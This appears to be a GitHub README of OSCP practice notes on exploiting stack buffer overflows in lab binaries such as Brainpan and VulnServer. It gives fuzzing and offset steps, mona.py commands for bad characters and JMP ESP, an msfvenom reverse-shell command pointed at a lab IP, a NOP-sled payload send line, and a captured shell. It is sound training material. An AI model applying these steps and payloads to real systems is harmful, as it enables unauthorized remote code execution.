# OSCP-BUFFER-OVERFLOW-PREP
This Repositry has my own practice notes of Buffer overflow Vulnrable Machine in easy,Beginer way.Please make sure to check every file so that it will be easy to understand how buffer overflow work and why you'll be learning => Fuzzing,Crashing,building simple script,finding badchar,using mona.py,genrating shell code.....
and more.

If You have fear of buffer overflow, then i'll say bro just chill it is easy. Make some practice.
you have to follow som steps to get the shell of victim host.
Brainpain,VulnServer,Ftp,Buffer Overflow prep from Tryhack me root by tib3rius sir.....and more comming soon
Be Connected Thank you!!


The very firs step is to getting the crash byte after knowing the host and port,vuln param 
of the server.....

Part 1

    Fuzzing the service parameter and getting the crash byte
    Generating the pattern
    Finding the correct offset where the byte crashes with the help of (EIP)

Part 2

    Finding the bad character with mona.py, and comparing bad character strings with mona.py
    Finding return address (JMP ESP) with mona.py

Part 3

    Setting breakpoint to verify RETURN address is correct or not
    Creating reverse shell with the help of msfvenom
    Adding NOP’s to the script
    Getting shell





1)So for the Any binary we have to fuzz from 100 to Untill crash the program,
   
    To do so first we have to find out which input parameter of the program is vulnrable to buffur overflow (Note this will be given).
    Then find out the crash byte of the program by fuzzing the parameter(Fuzzing just mean to send the payload again and again to crash the program).
 
   

2)Creating offset value. with msf 
     
     > /usr/bin/msf-pattern_create -l 3000
    where 3000 is Crash byte of the program when send Note Down the eip (Make sure to verify once again by restarting the immunity and this time send 'A'*crashbyte and          'B'*4 after the crashing   again you'll be able to see the 42424242 in EIP  )
 
   After getting the crash byte we have to control the intruction pointer
   to do this we'll use the msf venome 

3)Since we've the EIP adress where program crashed we'll genrate offset to get the exact crash byte where prgram crashed.

    /usr/bin/msf-pattern_offset -l 3000 -q 35724134 (where 35724134 value of eip)
    output- [*] Exact match at offset 524 


4)After getting the offset value wee need to perform the overflow with some more thing 
     
     now we have offset=524
     eip="B" * 4 (this will always contain the eip address after crashing the program as 42424242 whic is hex of B )
     shellcode= "C"* 400 (this is the space where the stack in buffer fill with  shell code )

5)Creating the working dir in im-debug
    
     '!mona config -set workingfolder c:\logs\%p' 

 Now next is to finding the bad char with the help of all possible hex

6)To do this we have to create an array with mona.py to compair with out paylod

    !mona bytearray -b '\x00'
    send the payload 

7)Now we have to verify if ther's any badchar....
    
    !mona compare -f C:\logs\brainpan\bytearray.bin -a 005FF910
    if the result is normal then ther's only one badchar  ecept: "/x00"

   Now we have to find the jump esp location 

8)Check if there is any module that is vulnrable and false by os
     
     !mona modules 
     ther's a module brainpain.exe

9)To get the jump statment have to perform this command
    
    !mona find -s "\xff\xe4" -m baianpan.exe
    this will retun the address of jump eip
    save the jump eip 311712f3 set this eip in payload as
    eip=eip= '\xf3\x12\x17\x31'
   
 Or you can get the jump stack pointer location by using this mathod too
    
    !mona jmp -r esp -cpb "\x00\x8c\xae\xbe\xfb"   #where '\x00...' value is bad char value..
    
    after putting this command immunity will pop a screen where the jump satack pointer location will be written like:
     625011af   ..........here will be module name...........
     
    jumpesp="\xaf\x11\x50\x62"   (this is the  little-endian form)


10)Setting the break point to check does it working or not ('this step is not necessary to perform you can jump to genrating the shell code')
    
     bp 0x311712f3
     to verify the break point is set view>view breakpoint>

11)Now set the  eip to  and try run again the payload 
    
    this will pass the program and jump to our brekpoint now 
    when resume the program it will retrun to shellcode that we given as payld

12)Creating the reverse shell code with the help of the msfvenome
    
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.132 LPORT=1234 -b '\x00' -f c

    where(-b is bad character and -f c is the revershell in c language

13)And add the nops valu (I'm using this because maybe control jump by leaving 8 or 16 bytes after the shell code)
    
    nops='\x90' * 20
    final command to send will be look like ==> s.send('OVERFLOW7 ' + buffer + jumpesp + nops + shellcode +'\r\n')

15)After the sending the payload (make sure to satart nc to listen )it might be the im_debug will pause so we have to tap on play again .....boom we got the shell

C:\Users\Saimson\Downloads>

C:\Users\Saimson\Downloads>whoami
whoami
desktop-hup6j62\saimson 


